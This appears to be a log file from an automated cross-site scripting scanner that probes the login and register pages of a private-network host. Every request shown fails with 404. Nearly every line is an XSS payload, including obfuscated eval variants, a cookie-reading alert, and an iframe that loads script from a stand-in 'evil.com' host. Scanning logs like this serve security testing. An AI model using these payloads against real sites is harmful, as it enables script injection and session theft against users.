+2025-01-29 22:52:31,987 - INFO - HTTP Request: GET http://172.20.10.3/login&password=%3Cscript%3Edocument.getElementById('myElem').innerHTML%20=%20'%3Cimg%20src="x"%20onerror="alert(1)"%20/%3E'%3C/script%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:31,987 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&password=<script>document.getElementById('myElem').innerHTML = '<img src="x" onerror="alert(1)" />'</script>: 404
+2025-01-29 22:52:32,172 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:32,361 - INFO - HTTP Request: GET http://172.20.10.3/login&password=%3Cscript%3Edocument.getElementById('myElem').innerHTML%20=%20"%3Cscript%3Ealert('XSS')%3C/script%3E"%3C/script%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:32,361 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&password=<script>document.getElementById('myElem').innerHTML = "<script>alert('XSS')</script>"</script>: 404
+2025-01-29 22:52:32,553 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:32,743 - INFO - HTTP Request: GET http://172.20.10.3/login&password=%3Ciframe%20src="javascript:alert('XSS')"%20width="0"%20height="0"%3E%3C/iframe%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:32,744 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&password=<iframe src="javascript:alert('XSS')" width="0" height="0"></iframe>: 404
+2025-01-29 22:52:32,938 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:33,125 - INFO - HTTP Request: GET http://172.20.10.3/login&password=%3Ciframe%20src="http://evil.com/evil.js"%3E%3C/iframe%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:33,125 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&password=<iframe src="http://evil.com/evil.js"></iframe>: 404
+2025-01-29 22:52:33,313 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:33,504 - INFO - HTTP Request: GET http://172.20.10.3/login&password=%3Cframe%20src="javascript:alert('XSS')"%3E%3C/frame%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:33,504 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&password=<frame src="javascript:alert('XSS')"></frame>: 404
+2025-01-29 22:52:33,505 - INFO - [36mCrawling: http://172.20.10.3:80/register
+2025-01-29 22:52:33,713 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:52:33,903 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:52:34,095 - INFO - HTTP Request: GET http://172.20.10.3/register&username=%3Cscript%3Ealert('XSS')%3C/script%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:34,095 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&username=<script>alert('XSS')</script>: 404
+2025-01-29 22:52:34,288 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:52:34,482 - INFO - HTTP Request: GET http://172.20.10.3/register&username=%3Cimg%20src="x"%20onerror="alert('XSS')"%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:34,482 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&username=<img src="x" onerror="alert('XSS')">: 404
+2025-01-29 22:52:34,674 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:52:34,863 - INFO - HTTP Request: GET http://172.20.10.3/register&username=%3Csvg/onload=alert('XSS')%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:34,863 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&username=<svg/onload=alert('XSS')>: 404
+2025-01-29 22:52:35,052 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:52:35,246 - INFO - HTTP Request: GET http://172.20.10.3/register&username=%3Ciframe%20src="javascript:alert('XSS')"%3E%3C/iframe%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:35,247 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&username=<iframe src="javascript:alert('XSS')"></iframe>: 404
+2025-01-29 22:52:35,436 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:52:35,627 - INFO - HTTP Request: GET http://172.20.10.3/register&username=%3Cbody%20onload=alert('XSS')%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:35,627 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&username=<body onload=alert('XSS')>: 404
+2025-01-29 22:52:35,818 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:52:36,007 - INFO - HTTP Request: GET http://172.20.10.3/register&username=%3Ca%20href="javascript:alert('XSS')"%3EClick%20me%3C/a%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:36,007 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&username=<a href="javascript:alert('XSS')">Click me</a>: 404
+2025-01-29 22:52:36,201 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:52:36,401 - INFO - HTTP Request: GET http://172.20.10.3/register&username=%3Csvg%3E%3Cscript%3Ealert('XSS')%3C/script%3E%3C/svg%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:36,401 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&username=<svg><script>alert('XSS')</script></svg>: 404
+2025-01-29 22:52:36,589 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:52:36,778 - INFO - HTTP Request: GET http://172.20.10.3/register&username=%3Cmath%3E%3Cmtext%20onload="alert('XSS')"%3EXSS%3C/mtext%3E%3C/math%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:36,778 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&username=<math><mtext onload="alert('XSS')">XSS</mtext></math>: 404
+2025-01-29 22:52:36,965 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:52:37,159 - INFO - HTTP Request: GET http://172.20.10.3/register&username=%3Csvg/onload=alert('XSS')%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:37,161 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&username=<svg/onload=alert('XSS')>: 404
+2025-01-29 22:52:37,348 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:52:37,540 - INFO - HTTP Request: GET http://172.20.10.3/register&username=%3Cembed%20src="javascript:alert('XSS')"%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:37,541 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&username=<embed src="javascript:alert('XSS')">: 404
+2025-01-29 22:52:37,744 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:52:37,936 - INFO - HTTP Request: GET http://172.20.10.3/register&username=%3Cobject%20data="javascript:alert('XSS')"%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:37,936 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&username=<object data="javascript:alert('XSS')">: 404
+2025-01-29 22:52:38,133 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:52:38,326 - INFO - HTTP Request: GET http://172.20.10.3/register&username=%3Cvideo%3E%3Csource%20onerror="alert('XSS')"%20src="x"%3E%3C/video%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:38,327 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&username=<video><source onerror="alert('XSS')" src="x"></video>: 404
+2025-01-29 22:52:38,516 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:52:38,708 - INFO - HTTP Request: GET http://172.20.10.3/register&username=%3Caudio%20onerror="alert('XSS')"%3E%3C/audio%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:38,708 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&username=<audio onerror="alert('XSS')"></audio>: 404
+2025-01-29 22:52:38,906 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:52:39,100 - INFO - HTTP Request: GET http://172.20.10.3/register&username=%3Cdetails%20open%3E%3Csummary%20onclick="alert('XSS')"%3EXSS%3C/summary%3E%3C/details%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:39,100 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&username=<details open><summary onclick="alert('XSS')">XSS</summary></details>: 404
+2025-01-29 22:52:39,298 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:52:39,483 - INFO - HTTP Request: GET http://172.20.10.3/register&username=%3Carea%20shape="rect"%20coords="0,0,10,10"%20href="javascript:alert('XSS')"%20/%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:39,483 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&username=<area shape="rect" coords="0,0,10,10" href="javascript:alert('XSS')" />: 404
+2025-01-29 22:52:39,682 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:52:39,876 - INFO - HTTP Request: GET http://172.20.10.3/register&username=%3Cscript%3Ealert(document.cookie)%3C/script%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:39,876 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&username=<script>alert(document.cookie)</script>: 404
+2025-01-29 22:52:40,066 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:52:40,255 - INFO - HTTP Request: GET http://172.20.10.3/register&username=%3Cscript%3Ealert(location)%3C/script%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:40,256 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&username=<script>alert(location)</script>: 404
+2025-01-29 22:52:40,453 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:52:40,658 - INFO - HTTP Request: GET http://172.20.10.3/register&username=%3Cscript%3Ealert(1+1)%3C/script%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:40,659 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&username=<script>alert(1+1)</script>: 404
+2025-01-29 22:52:40,859 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:52:41,062 - INFO - HTTP Request: GET http://172.20.10.3/register&username=%3Cscript%3Eeval('alert("XSS")')%3C/script%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:41,062 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&username=<script>eval('alert("XSS")')</script>: 404
+2025-01-29 22:52:41,251 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:52:41,452 - INFO - HTTP Request: GET http://172.20.10.3/register&username=%3Cscript%3Edocument.write("%3Cimg%20src='x'%20onerror='alert(1)'%20/%3E")%3C/script%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:41,452 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&username=<script>document.write("<img src='x' onerror='alert(1)' />")</script>: 404
+2025-01-29 22:52:41,645 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:52:41,863 - INFO - HTTP Request: GET http://172.20.10.3/register&username=%3Csvg/onload="alert('XSS')"%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:41,863 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&username=<svg/onload="alert('XSS')">: 404
+2025-01-29 22:52:42,053 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:52:42,304 - INFO - HTTP Request: GET http://172.20.10.3/register&username=%3Ca%20href="javascript:alert('XSS')"%3EClick%20Here%3C/a%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:42,304 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&username=<a href="javascript:alert('XSS')">Click Here</a>: 404
+2025-01-29 22:52:42,503 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:52:42,742 - INFO - HTTP Request: GET http://172.20.10.3/register&username=%3Cform%20action="javascript:alert('XSS')"%3E%3C/form%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:42,742 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&username=<form action="javascript:alert('XSS')"></form>: 404
+2025-01-29 22:52:42,971 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:52:43,190 - INFO - HTTP Request: GET http://172.20.10.3/register&username=%3Ciframe%20src="javascript:alert('XSS')"%3E%3C/iframe%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:43,191 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&username=<iframe src="javascript:alert('XSS')"></iframe>: 404
+2025-01-29 22:52:43,391 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:52:43,597 - INFO - HTTP Request: GET http://172.20.10.3/register&username=%3Cimg%20src="x"%20onerror="alert('XSS')"%20/%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:43,597 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&username=<img src="x" onerror="alert('XSS')" />: 404
+2025-01-29 22:52:43,796 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:52:43,991 - INFO - HTTP Request: GET http://172.20.10.3/register&username=%3Cvideo%3E%3Csource%20onerror="alert('XSS')"%20src="x"%3E%3C/video%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:43,991 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&username=<video><source onerror="alert('XSS')" src="x"></video>: 404
+2025-01-29 22:52:44,185 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:52:44,389 - INFO - HTTP Request: GET http://172.20.10.3/register&username=%3Cscript%3Edocument.body.innerHTML%20=%20"%3Cimg%20src=x%20onerror=alert('XSS')%3E"%3C/script%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:44,390 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&username=<script>document.body.innerHTML = "<img src=x onerror=alert('XSS')>"</script>: 404
+2025-01-29 22:52:44,590 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:52:44,808 - INFO - HTTP Request: GET http://172.20.10.3/register&username=%3Cscript%3Edocument.body.innerHTML%20=%20"%3Ca%20href=javascript:alert('XSS')%3Eclick%3C/a%3E"%3C/script%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:44,808 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&username=<script>document.body.innerHTML = "<a href=javascript:alert('XSS')>click</a>"</script>: 404
+2025-01-29 22:52:45,002 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:52:45,209 - INFO - HTTP Request: GET http://172.20.10.3/register&username=%3Cscript%3Edocument.location="javascript:alert('XSS')"%20%3C/script%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:45,210 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&username=<script>document.location="javascript:alert('XSS')" </script>: 404
+2025-01-29 22:52:45,409 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:52:45,613 - INFO - HTTP Request: GET http://172.20.10.3/register&username=%3Cscript%3Ewindow.location.href="javascript:alert('XSS')"%20%3C/script%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:45,614 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&username=<script>window.location.href="javascript:alert('XSS')" </script>: 404
+2025-01-29 22:52:45,817 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:52:46,019 - INFO - HTTP Request: GET http://172.20.10.3/register&username=%3Cscript%3Elocation.replace("javascript:alert('XSS')")%3C/script%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:46,020 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&username=<script>location.replace("javascript:alert('XSS')")</script>: 404
+2025-01-29 22:52:46,248 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:52:46,462 - INFO - HTTP Request: GET http://172.20.10.3/register&username=%3Cscript%3Edocument.write('%3Cscript%3Ealert("XSS")%3C/script%3E');%3C/script%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:46,462 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&username=<script>document.write('<script>alert("XSS")</script>');</script>: 404
+2025-01-29 22:52:46,657 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:52:46,858 - INFO - HTTP Request: GET http://172.20.10.3/register&username=%3Cscript%3Ewindow.top.location='javascript:alert("XSS")';%3C/script%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:46,858 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&username=<script>window.top.location='javascript:alert("XSS")';</script>: 404
+2025-01-29 22:52:47,056 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:52:47,289 - INFO - HTTP Request: GET http://172.20.10.3/register&username=%3Cimg%20src="x"%20onerror="alert('XSS')"%20/%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:47,290 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&username=<img src="x" onerror="alert('XSS')" />: 404
+2025-01-29 22:52:47,646 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:52:47,983 - INFO - HTTP Request: GET http://172.20.10.3/register&username=%3Cvideo%3E%3Csource%20onerror="alert('XSS')"%20src="x"%3E%3C/video%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:47,984 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&username=<video><source onerror="alert('XSS')" src="x"></video>: 404
+2025-01-29 22:52:48,353 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:52:48,715 - INFO - HTTP Request: GET http://172.20.10.3/register&username=%3Caudio%20onerror="alert('XSS')"%3E%3C/audio%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:48,716 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&username=<audio onerror="alert('XSS')"></audio>: 404
+2025-01-29 22:52:49,087 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:52:49,461 - INFO - HTTP Request: GET http://172.20.10.3/register&username=%3Cembed%20src="javascript:alert('XSS')"%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:49,461 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&username=<embed src="javascript:alert('XSS')">: 404
+2025-01-29 22:52:49,834 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:52:50,234 - INFO - HTTP Request: GET http://172.20.10.3/register&username=%3Ciframe%20src="javascript:alert('XSS')"%3E%3C/iframe%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:50,234 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&username=<iframe src="javascript:alert('XSS')"></iframe>: 404
+2025-01-29 22:52:50,602 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:52:50,974 - INFO - HTTP Request: GET http://172.20.10.3/register&username=%3Csvg/onload=alert(String.fromCharCode(88,83,83))%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:50,975 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&username=<svg/onload=alert(String.fromCharCode(88,83,83))>: 404
+2025-01-29 22:52:51,351 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:52:51,718 - INFO - HTTP Request: GET http://172.20.10.3/register&username=%3Cscript%3Ealert(String.fromCharCode(88,83,83))%3C/script%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:51,719 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&username=<script>alert(String.fromCharCode(88,83,83))</script>: 404
+2025-01-29 22:52:52,082 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:52:52,457 - INFO - HTTP Request: GET http://172.20.10.3/register&username=%3Csvg%3E%3Cscript%3Eeval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))%3C/script%3E%3C/svg%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:52,457 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&username=<svg><script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script></svg>: 404
+2025-01-29 22:52:52,820 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:52:53,171 - INFO - HTTP Request: GET http://172.20.10.3/register&username=%3Csvg%3E%3Cscript%3Eeval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))%3C/script%3E%3C/svg%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:53,171 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&username=<svg><script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script></svg>: 404
+2025-01-29 22:52:53,562 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:52:53,924 - INFO - HTTP Request: GET http://172.20.10.3/register&username=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:53,924 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&username=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E: 404
+2025-01-29 22:52:54,283 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:52:54,677 - INFO - HTTP Request: GET http://172.20.10.3/register&username=%3Cimg%20src%3Dx%20onerror%3Dalert('XSS')%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:54,677 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&username=%3Cimg%20src%3Dx%20onerror%3Dalert('XSS')%3E: 404
+2025-01-29 22:52:55,035 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:52:55,400 - INFO - HTTP Request: GET http://172.20.10.3/register&username=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:55,401 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&username=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E: 404
+2025-01-29 22:52:55,766 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:52:56,135 - INFO - HTTP Request: GET http://172.20.10.3/register&username=%3Cimg%20src%3Dx%20onerror%3Dalert('XSS')%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:56,136 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&username=%3Cimg%20src%3Dx%20onerror%3Dalert('XSS')%3E: 404
+2025-01-29 22:52:56,499 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:52:56,883 - INFO - HTTP Request: GET http://172.20.10.3/register&username=%3Csvg%20onload%3Dalert('XSS')%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:56,883 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&username=%3Csvg%20onload%3Dalert('XSS')%3E: 404
+2025-01-29 22:52:57,270 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:52:57,649 - INFO - HTTP Request: GET http://172.20.10.3/register&username=%3Ciframe%20src%3Djavascript%3Aalert('XSS')%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:57,649 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&username=%3Ciframe%20src%3Djavascript%3Aalert('XSS')%3E: 404
+2025-01-29 22:52:58,007 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:52:58,395 - INFO - HTTP Request: GET http://172.20.10.3/register&username=%3Cobject%20data%3Djavascript%3Aalert('XSS')%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:58,395 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&username=%3Cobject%20data%3Djavascript%3Aalert('XSS')%3E: 404
+2025-01-29 22:52:58,761 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:52:59,132 - INFO - HTTP Request: GET http://172.20.10.3/register&username=%3Caudio%20onerror%3Dalert('XSS')%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:59,133 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&username=%3Caudio%20onerror%3Dalert('XSS')%3E: 404
+2025-01-29 22:52:59,517 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:52:59,881 - INFO - HTTP Request: GET http://172.20.10.3/register&username=%3Cdetails%20open%3E%3Csummary%20onclick%3Dalert('XSS')%3EXSS%3C%2Fsummary%3E%3C%2Fdetails%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:59,881 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&username=%3Cdetails%20open%3E%3Csummary%20onclick%3Dalert('XSS')%3EXSS%3C%2Fsummary%3E%3C%2Fdetails%3E: 404
+2025-01-29 22:53:00,243 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:53:00,611 - INFO - HTTP Request: GET http://172.20.10.3/register&username=%3Cinput%20onfocus="alert('XSS')"%20autofocus%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:53:00,611 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&username=<input onfocus="alert('XSS')" autofocus>: 404
+2025-01-29 22:53:00,979 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:53:01,353 - INFO - HTTP Request: GET http://172.20.10.3/register&username=%3Cimg%20src="x"%20onerror="alert(1)"%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:53:01,354 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&username=<img src="x" onerror="alert(1)">: 404
+2025-01-29 22:53:01,722 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:53:02,103 - INFO - HTTP Request: GET http://172.20.10.3/register&username=%3Ca%20href="javascript:alert('XSS')"%3EClick%20me%3C/a%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:53:02,104 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&username=<a href="javascript:alert('XSS')">Click me</a>: 404
+2025-01-29 22:53:02,456 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:53:02,830 - INFO - HTTP Request: GET http://172.20.10.3/register&username=%3Cbutton%20onclick="alert('XSS')"%3EClick%20me%3C/button%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:53:02,830 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&username=<button onclick="alert('XSS')">Click me</button>: 404
+2025-01-29 22:53:03,203 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:53:03,567 - INFO - HTTP Request: GET http://172.20.10.3/register&username=%3Cinput%20type="button"%20value="Click%20me"%20onclick="alert('XSS')"%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:53:03,567 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&username=<input type="button" value="Click me" onclick="alert('XSS')">: 404
+2025-01-29 22:53:03,936 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:53:04,303 - INFO - HTTP Request: GET http://172.20.10.3/register&username=%3Ctextarea%20onfocus="alert('XSS')"%3ETest%3C/textarea%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:53:04,304 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&username=<textarea onfocus="alert('XSS')">Test</textarea>: 404
+2025-01-29 22:53:04,706 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:53:05,080 - INFO - HTTP Request: GET http://172.20.10.3/register&username=%3Cscript%3Ewindow['eval']('alert("XSS")')%3C/script%3E "HTTP/1.1 404 NOT FOUND"
